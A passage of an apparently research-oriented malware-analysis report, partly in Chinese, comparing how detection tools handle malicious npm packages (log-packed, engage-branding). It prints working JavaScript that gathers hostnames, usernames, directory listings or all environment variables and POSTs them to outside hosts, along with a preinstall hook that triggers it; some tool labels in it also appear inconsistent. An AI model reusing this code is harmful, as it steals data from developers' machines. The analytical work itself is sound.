  "is_malicious": true,
  "analysis_date": "2025-07-12T00:31:35.450036"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/styleshteks/2.0.0/extracted_styleshteks-2.0.0.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/styleshteks/2.0.0/extracted_styleshteks-2.0.0.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 2.0.0[0m]
[1m[+][0m    Checking package description.........[1m[31mRISK[0m [no description]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release tim
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/styleshteks/2.0.0/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/styleshteks/2.0.0/package' from local_nodejs...[1m[32mPASS[0m [[34mver 2.0.0[0m]
[1m[+][0m    Checking package description.........[1m[31mRISK[0m [no description]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking readme.........................[1m[31mRISK[0m [no readme]
[1m[+
... (truncated)
```

---

## 行为类别：Proxy Manipulation

**包名：** `log-packed`  
**版本：** `99.10.9`

### 代码上下文

#### 片段 1

**文件：** `package/index.js`  
**行号：** `202`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Collects and exfiltrates host/user info and directory listing to remote server via HTTPS POST.

**规避技术：** Filters targets, uses DNS and HTTPS, suppresses errors and output, blends with legitimate modules.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const fs = require('fs');
var path = require('path');
const packageJSON = require("./package.json");
const package = packageJSON.name;

// ... helper functions omitted for brevity ...

const td = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    ip: JSON.stringify(gethttpips()),
    dirs: JSON.stringify(getFiles(["C:\\","D:\\","/","/home"]))
}
var qs = toName(td);
if(isValid(td.hn,td.c,td.un,td.dirs)){
for(var j=0;j<qs.length;j++){
dns.lookup(qs[j], function(err, result) {
  //console.log(result)
});
}
const trackingData = JSON.stringify(td);
var postData = querystring.stringify({
    msg: trackingData,
});
var options = {
    hostname: "425a2.rt11.ml",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
}
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/index.js`  
**行号：** `212`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Collects and exfiltrates host/user info and directory listing to remote server via HTTPS POST.

**规避技术：** Filters targets, uses DNS and HTTPS, suppresses errors and output, blends with legitimate modules.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const fs = require('fs');
var path = require('path');
const packageJSON = require("./package.json");
const package = packageJSON.name;

// ... helper functions omitted for brevity ...

const td = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    ip: JSON.stringify(gethttpips()),
    dirs: JSON.stringify(getFiles(["C:\\","D:\\","/","/home"]))
}
var qs = toName(td);
if(isValid(td.hn,td.c,td.un,td.dirs)){
for(var j=0;j<qs.length;j++){
dns.lookup(qs[j], function(err, result) {
  //console.log(result)
});
}
const trackingData = JSON.stringify(td);
var postData = querystring.stringify({
    msg: trackingData,
});
var options = {
    hostname: "425a2.rt11.ml",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        //process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
}
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `package/package.json`  
**行号：** `8`  
**标注类型：** `npm-install-script`

**行为说明：** Executes index.js automatically before install, enabling arbitrary code execution on package install.

**规避技术：** Abuses npm preinstall hook to run hidden code before user inspects package contents.

**恶意代码：**
```javascript
"scripts":{
  "test":"echo 'error no test specified' && exit 1",
  "preinstall":"node index.js"
},
```

**形式化行为：** arbitrary_command_execution

**形式化规避：** preinstall_hook_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 1
- **RF：** 1
- **XGB：** 1

#### GENIE

```
# 批量恶意代码查询结果
"theft-os","Query","error","[[""SOURCE""|""relative:///package/index.js:173:9:173:20""]] to [[""SINK""|""relative:///package/index.js:212:11:212:18""]] | Flow Count: 4 | Method Name: homedir
[[""SOURCE""|""relative:///package/index.js:174:9:174:21""]] to [[""SINK""|""relative:///package/index.js:212:11:212:18""]] | Flow Count: 4 | Method Name: hostname
[[""SOURCE""|""relative:///package/index.js:175:9:175:21""]] to [[""SINK""|""relative:///package/index.js:212:11:212:18""]] | Flow Count: 4 | Method Name: userInfo
[[""SOURCE""|""relative:///package/index.js:176:25:176:40""]] to [[""SINK""|""relative:///package/index.js:212:11:212:18""]] | Flow Count: 4 | Method Name: getServers","/package/index.js","212","11","212","18"
```

#### GUARDDOG

```
Found 3 potentially malicious indicators in /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/log-packed/99.10.9/log-packed-99.10.9.tgz

npm-exfiltrate-sensitive-data: found 2 source code matches
  * This package is exfiltrating sensitive data to a remote server at package/index.js:202
        var req = https.request(options, (res) => {
        res.on("data", (d) => {
            //process.stdout.write(d);
        });
    });
  * This package is exfiltrating sensitive data to a remote server at package/index.js:212
        req.write(postData);

npm-install-script: found 1 source code matches
  * The package.json has a script automatically running when the package is installed at package/package.json:8
        "preinstall":"node index.js"
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m22[0m[31m ]--[0m
   Rule Id: [34mBD000103[0m
       Tag: [34mSecurity.Backdoor.Setup.Script[0m
  Severity: [36mModerate[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/package.json[0m
   Pattern: [32m(pre|post|)install"\s*:\s*"node [^\s]+\.js[0m
[30;1m5 | [0m[35m  "main":"index.js",[0m
[30;1m6 | [0m[35m  "scripts":{[0m
[30;1m7 | [0m[35m  "test":"echo 'error no test specified' && exit 1",[0m
[30;1m8 | [0m[35m  "preinstall":"node index.js"[0m
[30;1m9 | [0m[35m  },[0m
[30;1m10 | [0m[35m  "author":"",[0m
[30;1m11 | [0m[35m  "License":"ISC"[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m22[0m[31m ]--[0m
   Rule Id: [34mBD000710[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.DNSSettings[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/package/index.js[0m
   Pattern: [32mdns.getServers[0m
[30;1m173 | [0m[35m    hd: os.homedir()
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "log-packed",
  "version": "99.10.9",
  "total_files": 1,
  "analyzed_files": 1,
  "malicious_files": 0,
  "is_malicious": false,
  "analysis_date": "2025-07-11T04:25:19.977237"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/log-packed/99.10.9/extracted_log-packed-99.10.9.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/log-packed/99.10.9/extracted_log-packed-99.10.9.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 99.10.9[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mazure package[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checki
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/log-packed/99.10.9/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/log-packed/99.10.9/package' from local_nodejs...[1m[32mPASS[0m [[34mver 99.10.9[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mazure package[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking readme.........................[1m[31mRISK[0m [no re
... (truncated)
```

---

## 行为类别：System Reconnaissance

**包名：** `engage-branding`  
**版本：** `1.10.2`

### 代码上下文

#### 片段 1

**文件：** `package/index.js`  
**行号：** `40`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Collects environment and network info, exfiltrates via HTTPS POST to external server.

**规避技术：** Uses legitimate modules, minimal error handling, blends with normal network activity.

**恶意代码：**
```javascript
'use strict'

// This code dumps local env variable and post them to an http server to identify the machines vulnerable to npmjs org/package claim.
// If you see this comment, please contact security@nexthink.com - this code and server are under the control of the Nexthink Security Team and no harmful code is executed.

const env = process.env;

const os = require("os");
env.hostname  = os.hostname();
env.package = "engage-branding";

const nets = os.networkInterfaces();
const results = Object.create(null);
for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
        // Skip internal (i.e. 127.0.0.1) addresses
        if (!net.internal) {
            if (!results[name]) {
                results[name] = [];
            }
            results[name].push(net.address);
        }
    }
}
env.inets = JSON.stringify(results);

// request options
const options = {
    host: "doc.nexthink.com",
    path: '/npm',
    method: 'POST',
    body: JSON.stringify(env),
    headers: {
        'Content-Type': 'application/json'
    }
}

// send POST request
const https = require('https');
const request = https.request(options, (res) => {
    if (res.statusCode !== 200) {
        res.resume();
        return;
    }
    res.on('close', () => {
    });
});
request.write(JSON.stringify(env));
request.end();
request.on('error', (err) => {
    console.error(`Encountered an error trying to make a request: ${
        err.message
    }`);
});
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- **Packj Trace：未检测到**（未找到明确恶意迹象）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/index.js`  
**行号：** `48`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Collects and exfiltrates environment and network info via HTTPS POST to external server.

**规避技术：** Uses legitimate modules, blends with normal code, minimal error handling, no user notification.

**恶意代码：**
```javascript
'use strict'

// This code dumps local env variable and post them to an http server to identify the machines vulnerable to npmjs org/package claim.
// If you see this comment, please contact security@nexthink.com - this code and server are under the control of the Nexthink Security Team and no harmful code is executed.

const env = process.env;

const os = require("os");
env.hostname  = os.hostname();
env.package = "engage-branding";

const nets = os.networkInterfaces();
const results = Object.create(null);
for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
        // Skip internal (i.e. 127.0.0.1) addresses
        if (!net.internal) {
            if (!results[name]) {
                results[name] = [];
            }
            results[name].push(net.address);
        }
    }
}
env.inets = JSON.stringify(results);

// request options
const options = {
    host: "doc.nexthink.com",
    path: '/npm',
    method: 'POST',
    body: JSON.stringify(env),
    headers: {
        'Content-Type': 'application/json'
    }
}

// send POST request
const https = require('https');
const request = https.request(options, (res) => {
    if (res.statusCode !== 200) {
        res.resume();
        return;
    }
    res.on('close', () => {
    });
});
request.write(JSON.stringify(env));
request.end();
request.on('error', (err) => {
    console.error(`Encountered an error trying to make a request: ${
        err.message
    }`);
});
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- **Packj Trace：未检测到**（未找到明确恶意迹象）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 0
- **RF：** 0
- **XGB：** 0

#### GENIE

```
# 批量恶意代码查询结果
"theft-environment","Query","error","[[""SOURCE""|""relative:///package/index.js:6:13:6:23""]] to [[""SINK""|""relative:///package/index.js:48:15:48:33""]]","/package/index.js","48","15","48","33"
```

#### GUARDDOG

```
Found 2 potentially malicious indicators in /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/engage-branding/1.10.2/engage-branding-1.10.2.tgz

npm-exfiltrate-sensitive-data: found 2 source code matches
  * This package is exfiltrating sensitive data to a remote server at package/index.js:40
        const request = https.request(options, (res) => {
        if (res.statusCode !== 200) {
            res.resume();
            return;
        }
        res.on('close', () => {
        });
    });
  * This package is exfiltrating sensitive data to a remote server at package/index.js:48
        request.write(JSON.stringify(env));
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m8[0m[31m ]--[0m
   Rule Id: [34mBD000702[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Environment[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/index.js[0m
   Pattern: [32m(env|environment).{1,50}(get|post|curl|nc|invoke-restmethod)[0m
[30;1m3 | [0m[35m// This code dumps local env variable and post them to an http server to identify the machines vulne[0m
[30;1m4 | [0m[35m// If you see this comment, please contact security@nexthink.com - this code and server are under th[0m
[30;1m5 | [0m[35m[0m
[30;1m6 | [0m[35mconst env = process.env;[0m
[30;1m7 | [0m[35m[0m
[30;1m8 | [0m[35mconst os = require("os");[0m
[30;1m9 | [0m[35menv.hostname  = os.hostname();[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m8[0m[31m ]--[0m
   Rule Id: [34mBD000702[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Environment[0m
  Severity: [36mI
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "engage-branding",
  "version": "1.10.2",
  "total_files": 1,
  "analyzed_files": 1,
  "malicious_files": 0,
  "is_malicious": false,
  "analysis_date": "2025-07-11T14:58:01.077477"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/engage-branding/1.10.2/extracted_engage-branding-1.10.2.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/engage-branding/1.10.2/extracted_engage-branding-1.10.2.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 1.10.2[0m]
[1m[+][0m    Checking package description.........[1m[31mRISK[0m [no description]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m   
... (truncated)
```

#### PACKJ_TRACE

```
ERROR: 分析超时（600秒）
```

---

